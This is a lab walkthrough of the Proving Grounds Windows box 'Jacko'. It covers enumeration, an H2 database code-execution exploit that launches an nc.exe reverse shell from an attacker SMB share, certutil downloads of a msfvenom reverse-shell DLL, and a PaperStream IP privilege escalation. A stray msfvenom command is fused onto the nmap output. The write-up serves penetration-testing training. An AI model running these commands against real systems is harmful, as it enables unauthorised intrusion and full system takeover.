---
layout: post
title: Proving Grounds - Jacko (Intermediate)
---

# Introduction 

This is an Intermediate Windows box on Proving Grounds.

# Enumeration
```bash
$ sudo nmap --min-rate 100 -sV -sC -T4  192.168.225.66  -oA nmap/versions -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-25 08:49 EDT
Nmap scan report for ip-192-168-225-66.eu-west-1.compute.internal (192.168.225.66)
Host is up (0.0070s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: H2 Database Engine (redirect)
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8082/tcp open  http          H2 database http console
|_http-title: H2 Console
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-04-25T12:49:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.13 secondsmsfvenom -p windows/x64/shell_reverse_tcp -f dll -o UninOldIS.dll LHOST=192.168.49.225 LPORT=
```

Checking over all ports, we find one more open at 7680.
```bash
$ sudo nmap --min-rate 100 -p- -T4  192.168.225.66  -oA nmap/all 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-25 08:49 EDT
Nmap scan report for ip-192-168-225-66.eu-west-1.compute.internal (192.168.225.66)
Host is up (0.011s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
7680/tcp open  pando-pub
8082/tcp open  blackice-alerts

Nmap done: 1 IP address (1 host up) scanned in 189.45 seconds
```

## Webservers

H2 database console at port 8082

JSP based
![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425091314.png)

Dirsearch - think these are FPs
```bash
[09:02:33] 200 -  937B  - /.do
[09:02:43] 200 -  937B  - /admin.do
[09:02:43] 200 -  937B  - /admin/login.do
[09:02:55] 200 -    4KB - /favicon.ico
[09:03:03] 200 -  937B  - /patient/login.do
[09:03:03] 200 -  937B  - /patient/register.do
[09:03:05] 200 -  937B  - /physican/login.do
```

port 80 - IIS 10

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425091527.png)

Seems to just contain the Tutorial and License etc. Nothing interesting.

Using dirsearch for further enumeration:
```bash
[09:07:53] 301 -  150B  - /html  ->  http://192.168.225.66/html/     (Added to queue)
[09:08:09] 301 -  150B  - /help  ->  http://192.168.225.66/help/     (Added to queue)
[09:08:10] 301 -  152B  - /images  ->  http://192.168.225.66/images/     (Added to queue)
[09:08:10] 200 -    2KB - /index.html
[09:08:22] 301 -  150B  - /text  ->  http://192.168.225.66/text/     (Added to queue)
[09:08:26] Starting: html/
[09:08:30] 200 -   51KB - /html/CHANGELOG.html
[09:08:30] 200 -   51KB - /html/CHANGELOG.HTML
[09:08:30] 200 -   51KB - /html/Changelog.html
[09:08:30] 200 -   51KB - /html/ChangeLog.html
[09:08:38] 200 -   51KB - /html/changelog.html
[09:08:41] 200 -    3KB - /html/download.html
[09:08:43] 200 -   13KB - /html/faq.html
[09:08:44] 301 -  157B  - /html/images  ->  http://192.168.225.66/html/images/     (Added to queue)
[09:08:45] 200 -    4KB - /html/installation.html
[09:08:46] 200 -   22KB - /html/links.html
[09:08:47] 200 -    1KB - /html/main.html
[09:08:53] 200 -    8KB - /html/search.js
[09:09:00] Starting: help/
[09:09:34] Starting: images/
[09:09:49] 200 -    4KB - /images/favicon.ico
[09:10:06] Starting: text/
[09:10:39] Starting: html/images/
```

Changelog shows version of H2 -  **Version 1.4.199** (2019-03-13)

We can login to the database with a blank password

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425092949.png)


Code execution vulnerability in H2

https://www.exploit-db.com/exploits/49384

Host nc.exe on SMB server 
```bash
sudo impacket-smbserver data -smb2support  .
```

```java
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("cmd.exe /c //192.168.49.225/data/nc.exe -e cmd.exe 192.168.49.225 8082").getInputStream()).useDelimiter("\\Z").next()');
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094238.png)

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094250.png)

# Post Exploitation

Get shell - weirdly doesn't have the command whoami

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094342.png)

We can fix this by setting PATH

```
set PATH=%SystemRoot%\system32;%SystemRoot%;
```

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425094707.png)

Host Name:                 JACKO
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.18363 N/A Build 18363

Running winPEAS
![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425100928.png)

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425101156.png)


It is always a good idea to check the Program Files directories during the enumeration phase to gather information on any unusual software that may be installed on the machine. Here in `Program Files (x86)` we can see PaperStream IP:

![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425101322.png)

[PaperStream IP (TWAIN) 1.42.0.5685 - Local Privilege Escalation](https://www.exploit-db.com/exploits/49382)

Upload PS script and DLL via certutil
```bash
certutil -urlcache -split -f http://192.168.49.225/49382.ps1 49382.ps1
certutil -urlcache -split -f http://192.168.49.225/UninOldIS.dll UninOldIS.dll
```

```powershell
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass C:\Users\tony\Documents\49382.ps1
```
![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425110206.png)

System shell
![]({{site.baseurl}}/assets/resources/Pasted%20image%2020220425110047.png)
